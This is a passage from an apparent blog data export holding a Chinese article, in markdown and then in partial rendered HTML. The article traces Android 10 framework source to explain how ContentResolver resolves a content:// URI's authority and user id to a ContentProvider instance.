方法中的参数uri，看看它的流向。根据源码设计的套路，起初几层调用都是看不到要害之处的，所以我们无需细读。来来来，先看ContentResolver的 `query` 方法：\n\n```java\n    @Override\n    public final @Nullable Cursor query(final @RequiresPermission.Read @NonNull Uri uri,\n            @Nullable String[] projection, @Nullable Bundle queryArgs,\n            @Nullable CancellationSignal cancellationSignal) {\n        // ...\n        // 获取“不稳定”的Provider\n        IContentProvider unstableProvider = acquireUnstableProvider(uri);\n        if (unstableProvider == null) {\n            return null;\n        }\n        IContentProvider stableProvider = null;\n        Cursor qCursor = null;\n        try {\n            // ...\n            try {\n                // 尝试查询操作\n                qCursor = unstableProvider.query(mPackageName, uri, projection,\n                        queryArgs, remoteCancellationSignal);\n            } catch (DeadObjectException e) {\n                // The remote process has died...  but we only hold an unstable\n                // reference though, so we might recover!!!  Let's try!!!!\n                // This is exciting!!1!!1!!!!1\n                // 这段注释我特意没删，感觉特别皮。大意：远程进程已死亡，但我们还持有unstableProvider的引用，快试试回收它的资源！这真是一颗赛艇！（虽然我不知道到底这哪儿exciting了）\n                unstableProviderDied(unstableProvider);\n                // “不稳定”的Provider操作失败，获取“稳定”的Provider\n                stableProvider = acquireProvider(uri);\n                if (stableProvider == null) {\n                    return null;\n                }\n                // 再次尝试查询操作\n                qCursor = stableProvider.query(\n                        mPackageName, uri, projection, queryArgs, remoteCancellationSignal);\n                }\n            if (qCursor == null) {\n                return null;\n            }\n            // ...\n        } catch (RemoteException e) {\n            // ...\n            return null;\n        } finally {\n            // 释放资源\n        }\n    }\n```\n\n从上述源码可得知，有两处代码在根据uri获取ContentProvider，即ContentResolver的 `acquireUnstableProvider` 和 `acquireProvider` 方法。先看看前者（后者最终殊途同归，本文不额外分析）：\n\n```java\n    public final IContentProvider acquireUnstableProvider(Uri uri) {\n        if (!SCHEME_CONTENT.equals(uri.getScheme())) {\n            // 这里硬核匹配字符串，凡是scheme不是content://的直接再见，所以它是固定的\n            return null;\n        }\n        String auth = uri.getAuthority(); // 按例，此处获取到的字符串便包含\"com.xxx.yyy.provider\"\n        if (auth != null) {\n            // 此为ContentResolver中的抽象方法，由子Resolver各自具体实现\n            return acquireUnstableProvider(mContext, uri.getAuthority());\n        }\n        return null;\n    }\n```\n\n于是我们追踪到ContextImpl的静态内部类ApplicationContentResolver：\n\n```java\n    private static final class ApplicationContentResolver extends ContentResolver {\n        @UnsupportedAppUsage\n        private final ActivityThread mMainThread;\n        // ...\n        @Override\n        protected IContentProvider acquireUnstableProvider(Context c, String auth) {\n            return mMainThread.acquireProvider(c,\n                    ContentProvider.getAuthorityWithoutUserId(auth),\n                    resolveUserIdFromAuthority(auth), false);\n        }\n    }\n```\n\n实际调用到ActivityThread当中去了，注意此时传递的关键参数已经是 **auth** 而不是uri了：\n\n```java\n    @UnsupportedAppUsage\n    public final IContentProvider acquireProvider(\n            Context c, String auth, int userId, boolean stable) {\n        // 获取已存在的Provider    \n        final IContentProvider provider = acquireExistingProvider(c, auth, userId, stable);\n        if (provider != null) {\n        \treturn provider;\n        }\n        // ...\n        // 没获取到再尝试安装，这里来个插眼，等会有大用\n        holder = installProvider(c, holder, holder.info,\n                true /*noisy*/, holder.noReleaseNeeded, stable);\n        return holder.provider;\n    }\n```\n\n看源码一般来说最好先深后广，且优先搞清热点代码。接下来我们看 `acquireExistingProvider` 方法：\n\n```java\n    public final IContentProvider acquireExistingProvider( Context c, String auth, int userId, boolean stable) {\n        synchronized (mProviderMap) {\n            final ProviderKey key = new ProviderKey(auth, userId);\n            // 关注这个存储Provider记录的的map，其实这里就是本文重点\n            final ProviderClientRecord pr = mProviderMap.get(key);\n            if (pr == null) {\n                return null;\n            }\n\n            IContentProvider provider = pr.mProvider; // 最终获取Provider实例\n            IBinder jBinder = provider.asBinder();\n            if (!jBinder.isBinderAlive()) {\n                // Provider所在进程已死，直接返回null\n                handleUnstableProviderDiedLocked(jBinder, true);\n                return null;\n            }\n            // ...\n            return provider;\n        }\n    }\n```\n\n分析到这里，就自然而然有几个问题了， **ProviderKey** 是什么，怎么构造的？ **mProviderMap** 又是什么时候填充的？\n带着问题，先看前者：\n\n```java\n    private static final class ProviderKey {\n        final String authority;\n        final int userId;\n\n        public ProviderKey(String authority, int userId) {\n            this.authority = authority;\n            this.userId = userId;\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            // ...\n        }\n\n        @Override\n        public int hashCode() {\n            // ...\n        }\n    }\n```\n\n可见， **ProviderKey** 是ActivityThread当中的一个内部POJO，非常普通，没有对入参做任何特殊处理。那么ContentProvider也就是根据 **authority** 和 **userId** 来唯一确定的，对应了文章开头的介绍。\n此外，由于Android目前是多用户操作系统（国产ROM淡化了此概念，但应用双开、系统分身等功能实现均与多用户有关），所以这里用户id是必要的。\n\n接下来看后一个问题， **mProviderMap** 从哪儿来？什么时候添加的Provider记录？很简单了，还是在ActivityThread当中，实例化如下：\n\n```java\n    @UnsupportedAppUsage\n    final ArrayMap<ProviderKey, ProviderClientRecord> mProviderMap\n        = new ArrayMap<ProviderKey, ProviderClientRecord>();\n```\n\n且仅有一处在进行 `put` 操作：\n\n```java\n    private ProviderClientRecord installProviderAuthoritiesLocked(IContentProvider provider,\n            ContentProvider localProvider, ContentProviderHolder holder) {\n        final String auths[] = holder.info.authority.split(\";\");\n        final int userId = UserHandle.getUserId(holder.info.applicationInfo.uid);\n\n        if (provider != null) {\n            // ...\n        }\n\n        final ProviderClientRecord pcr = new ProviderClientRecord(\n                auths, provider, localProvider, holder);\n        for (String auth : auths) {\n            final ProviderKey key = new ProviderKey(auth, userId);\n            final ProviderClientRecord existing = mProviderMap.get(key);\n            if (existing != null) {\n                // ...\n            } else {\n                mProviderMap.put(key, pcr); // 在此处添加的\n            }\n        }\n        return pcr;\n    }\n```\n\n可见，ProviderClientRecord实例的构造是在这个 `installProviderAuthoritiesLocked` 私有方法中完成并添加到map中的。\n这里有个小插曲**特别注意**：方法的第一行代码，对 **authority** 字符串进行了分割（分隔符为;），最终ProviderClientRecord的数量也取决于分割出来的数组。所以在Manifest配置文件中声明 `android:authorities` 属性时，可以填入多个授权host（就好比多个域名可以同时指向一个网站），以分号分割，难怪属性名要用复数呢。\n\n接下来看看 `installProviderAuthoritiesLocked` 方法的调用处：\n\n```java\n    @UnsupportedAppUsage\n    private ContentProviderHolder installProvider(Context context,\n            ContentProviderHolder holder, ProviderInfo info,\n            boolean noisy, boolean noReleaseNeeded, boolean stable) {\n        ContentProvider localProvider = null;\n        IContentProvider provider;\n        if (holder == null || holder.provider == null) {\n            // ...\n        } else {\n            provider = holder.provider;\n            // ...\n        }\n\n        ContentProviderHolder retHolder;\n\n        synchronized (mProviderMap) {\n            // ...\n            IBinder jBinder = provider.asBinder();\n            if (localProvider != null) {\n                ComponentName cname = new ComponentName(info.packageName, info.name);\n                ProviderClientRecord pr = mLocalProvidersByName.get(cname);\n                if (pr != null) {\n                    // ...\n                } else {\n                    // ...\n                    // 第一处调用\n                    pr = installProviderAuthoritiesLocked(provider, localProvider, holder);\n                    // ...\n                }\n                retHolder = pr.mHolder;\n            } else {\n                ProviderRefCount prc = mProviderRefCountMap.get(jBinder);\n                if (prc != null) {\n                    // ...\n                } else {\n                    // 第二处调用\n                    ProviderClientRecord client = installProviderAuthoritiesLocked(\n                            provider, localProvider, holder);\n                    // ...\n                }\n                retHolder = prc.holder;\n            }\n        }\n        return retHolder;\n    }\n```\n\n由上， `installProviderAuthoritiesLocked` 方法的调用均在 `installProvider` 方法中。还记得上文的“插眼”吗？呼应上了。\n\n### 总结\n\n- 在我们使用ContentResolver来进行查询操作时，`query` 方法层层调用到 **ActivityThread** 的 `acquireExistingProvider` 方法，根据URI字符串当中的授权host（即 **authority** ）和当前所在用户的 **userId** 来获取对应的Provider实例。\n\n- 当 `acquireExistingProvider` 获取不到时，则通过 `installProvider` 方法来安装Provider并把其载体 **ProviderClientRecord** 添加到 **mProviderMap** 中。\n\n- AndroidManifest中声明Provider时， `android:authorities` 属性可以填多个字符串，以分号分割：\n\n  ```xml\n  <provider\n      android:name=\".provider.TestProvider\"\n      android:authorities=\"com.xxx.yyy.provider;cn.xxx.yyy.provider;net.xxx.yyy.provider\"\n      ... />\n  ```\n\n  如此可以写成多种不同host的URI，映射的却还是同一个ContentProvider。具体的好处我能想到的有几点：\n\n  - 与同IP多域名的网站一样，域名多样化，提前抢占一些host，避免三方假冒。\n  - 提供不同的URI分别给内部和外部开发者使用，便于区分和数据统计。\n","slug":"源码茶舍之如何由Uri找寻ContentProvider","published":1,"updated":"2024-03-25T07:31:25.860Z","comments":1,"photos":[],"link":"","_id":"cluaufh0x0029the6295e4xlk","content":"<h3 id=\"引子\"><a href=\"#引子\" class=\"headerlink\" title=\"引子\"></a>引子</h3><p>我们都知道四大组件之一ContentProvider的用处，它给大家提供一种统一的数据访问格式。调用者无需关心数据源于何处（如DB、XML文件和网络等），只需获取到对应的ContentResolver来进行增删查改即可。<br>自己实现一个Provider的时候，也会在配置文件中声明如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">provider</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.provider.TestProvider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:authorities</span>=<span class=\"string\">&quot;com.xxx.yyy.provider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:readPermission</span>=<span class=\"string\">&quot;com.xxx.yyy.permission.READ_PROVIDER&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中 <code>authorities</code> 是该Provider的唯一标识，所以一般都写成包名与其他字符串的组合形式，若需提供数据给其他应用，则 <code>exported</code> 要设为true，同时比较规范的做法还需要加上读写权限。<br>然后，我们再从常见的查询操作说起：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ContentResolver</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> getContentResolver();</span><br><span class=\"line\"><span class=\"type\">Uri</span> <span class=\"variable\">uri</span> <span class=\"operator\">=</span> Uri.parse(<span class=\"string\">&quot;content://com.xxx.yyy.provider/test_path/1&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> r.query(uri, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n\n<p>如同访问某个网站，我们访问ContentProvider也需要一个URI，其数据格式：</p>\n<ul>\n<li>scheme前缀是固定的： <strong>content:&#x2F;&#x2F;</strong></li>\n<li>授权host：此例中为 <strong>com.xxx.yyy.provider</strong></li>\n<li>路径与参数：此例中为 <strong>test_path&#x2F;1</strong></li>\n</ul>\n<p>那么，系统是如何通过这样一个URI来锁定对应的ContentProvider呢？</p>\n<h3 id=\"找寻\"><a href=\"#找寻\" class=\"headerlink\" title=\"找寻\"></a>找寻</h3><p>主要涉及源码（基于Android 10）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frameworks/base/core/java/android/content/ContentResolver.java</span><br><span class=\"line\">frameworks/base/core/java/android/app/ContextImpl.java</span><br><span class=\"line\">frameworks/base/core/java/android/app/ActivityThread.java</span><br></pre></td></tr></table></figure>\n\n<p>大致思路，便是追踪上述 <code>query</code> 方法中的参数uri，看看它的流向。根据源码设计的套路，起初几层调用都是看不到要害之处的，所以我们无需细读。来来来，先看ContentResolver的 <code>query</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"meta\">@Nullable</span> Cursor <span class=\"title function_\">query</span><span class=\"params\">(<span class=\"keyword\">final</span> <span class=\"meta\">@RequiresPermission</span>.Read <span class=\"meta\">@NonNull</span> Uri uri,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@Nullable</span> String[] projection, <span class=\"meta\">@Nullable</span> Bundle queryArgs,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@Nullable</span> CancellationSignal cancellationSignal)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"comment\">// 获取“不稳定”的Provider</span></span><br><span class=\"line\">    <span class=\"type\">IContentProvider</span> <span class=\"variable\">unstableProvider</span> <span class=\"operator\">=</span> acquireUnstableProvider(uri);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (unstableProvider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">IContentProvider</span> <span class=\"variable\">stableProvider</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"type\">Cursor</span> <span class=\"variable\">qCursor</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 尝试查询操作</span></span><br><span class=\"line\">            qCursor = unstableProvider.query(mPackageName, uri, projection,</span><br><span class=\"line\">                    queryArgs, remoteCancellationSignal);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (DeadObjectException e) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// The remote process has died...  but we only hold an unstable</span></span><br><span class=\"line\">            <span class=\"comment\">// reference though, so we might recover!!!  Let&#x27;s try!!!!</span></span><br><span class=\"line\">            <span class=\"comment\">// This is exciting!!1!!1!!!!1</span></span><br><span class=\"line\">            <span class=\"comment\">// 这段注释我特意没删，感觉特别皮。大意：远程进程已死亡，但我们还持有unstableProvider的引用，快试试回收它的资源！这真是一颗赛艇！（虽然我不知道到底这哪儿exciting了）</span></span><br><span class=\"line\">            unstableProviderDied(unstableProvider);</span><br><span class=\"line\">            <span class=\"comment\">// “不稳定”的Provider操作失败，获取“稳定”的Provider</span></span><br><span class=\"line\">            stableProvider = acquireProvider(uri);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stableProvider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 再次尝试查询操作</span></span><br><span class=\"line\">            qCursor = stableProvider.query(</span><br><span class=\"line\">                    mPackageName, uri, projection, queryArgs, remoteCancellationSignal);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (qCursor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RemoteException e) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 释放资源</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上述源码可得知，有两处代码在根据uri获取ContentProvider，即ContentResolver的 <code>acquireUnstableProvider</code> 和 <code>acquireProvider</code> 方法。先看看前者（后者最终殊途同归，本文不额外分析）：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireUnstableProvider</span><span class=\"params\">(Uri uri)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!SCHEME_CONTENT.equals(uri.getScheme())) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 这里硬核匹配字符串，凡是scheme不是content://的直接再见，所以它是固定的</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">auth</span> <span class=\"operator\">=</span> uri.getAuthority(); <span class=\"comment\">// 按例，此处获取到的字符串便包含&quot;com.xxx.yyy.provider&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (auth != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 此为ContentResolver中的抽象方法，由子Resolver各自具体实现</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> acquireUnstableProvider(mContext, uri.getAuthority());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>于是我们追踪到ContextImpl的静态内部类ApplicationContentResolver：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ApplicationContentResolver</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ContentResolver</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ActivityThread mMainThread;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> IContentProvider <span class=\"title function_\">acquireUnstableProvider</span><span class=\"params\">(Context c, String auth)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mMainThread.acquireProvider(c,</span><br><span class=\"line\">                ContentProvider.getAuthorityWithoutUserId(auth),</span><br><span class=\"line\">                resolveUserIdFromAuthority(auth), <span class=\"literal\">false</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实际调用到ActivityThread当中去了，注意此时传递的关键参数已经是 <strong>auth</strong> 而不是uri了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireProvider</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">        Context c, String auth, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获取已存在的Provider    </span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">IContentProvider</span> <span class=\"variable\">provider</span> <span class=\"operator\">=</span> acquireExistingProvider(c, auth, userId, stable);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (provider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">return</span> provider;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"comment\">// 没获取到再尝试安装，这里来个插眼，等会有大用</span></span><br><span class=\"line\">    holder = installProvider(c, holder, holder.info,</span><br><span class=\"line\">            <span class=\"literal\">true</span> <span class=\"comment\">/*noisy*/</span>, holder.noReleaseNeeded, stable);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> holder.provider;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看源码一般来说最好先深后广，且优先搞清热点代码。接下来我们看 <code>acquireExistingProvider</code> 方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> IContentProvider <span class=\"title function_\">acquireExistingProvider</span><span class=\"params\">( Context c, String auth, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mProviderMap) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderKey</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderKey</span>(auth, userId);</span><br><span class=\"line\">        <span class=\"comment\">// 关注这个存储Provider记录的的map，其实这里就是本文重点</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pr</span> <span class=\"operator\">=</span> mProviderMap.get(key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pr == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">IContentProvider</span> <span class=\"variable\">provider</span> <span class=\"operator\">=</span> pr.mProvider; <span class=\"comment\">// 最终获取Provider实例</span></span><br><span class=\"line\">        <span class=\"type\">IBinder</span> <span class=\"variable\">jBinder</span> <span class=\"operator\">=</span> provider.asBinder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!jBinder.isBinderAlive()) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Provider所在进程已死，直接返回null</span></span><br><span class=\"line\">            handleUnstableProviderDiedLocked(jBinder, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> provider;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>分析到这里，就自然而然有几个问题了， <strong>ProviderKey</strong> 是什么，怎么构造的？ <strong>mProviderMap</strong> 又是什么时候填充的？<br>带着问题，先看前者：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ProviderKey</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String authority;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> userId;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ProviderKey</span><span class=\"params\">(String authority, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.authority = authority;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.userId = userId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">equals</span><span class=\"params\">(Object o)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">hashCode</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见， <strong>ProviderKey</strong> 是ActivityThread当中的一个内部POJO，非常普通，没有对入参做任何特殊处理。那么ContentProvider也就是根据 <strong>authority</strong> 和 <strong>userId</strong> 来唯一确定的，对应了文章开头的介绍。<br>此外，由于Android目前是多用户操作系统（国产ROM淡化了此概念，但应用双开、系统分身等功能实现均与多用户有关），所以这里用户id是必要的。</p>\n<p>接下来看后一个问题， <strong>mProviderMap</strong> 从哪儿来？什么时候添加的Provider记录？很简单了，还是在ActivityThread当中，实例化如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> ArrayMap&lt;ProviderKey, ProviderClientRecord&gt; mProviderMap</span><br><span class=\"line\">    = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayMap</span>&lt;ProviderKey, ProviderClientRecord&gt;();</span><br></pre></td></tr></table></figure>\n\n<p>且仅有一处在进行 <code>put</code> 操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 